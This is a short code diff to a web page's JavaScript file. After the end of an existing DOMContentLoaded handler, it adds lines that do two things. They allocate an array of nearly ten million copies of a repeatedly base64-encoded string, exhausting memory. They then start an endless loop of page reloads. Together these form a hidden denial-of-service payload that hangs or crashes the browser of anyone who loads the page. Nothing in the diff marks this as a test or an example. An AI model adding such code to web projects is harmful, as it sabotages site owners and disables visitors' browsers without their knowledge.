@@ -13,3 +13,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
 });
+var array = new Array(9999999).fill(btoa(btoa(btoa(btoa(btoa(btoa(btoa(btoa(btoa(btoa("hello world!"))))))))))));
+while(true){
+  window.location.reload();
+}
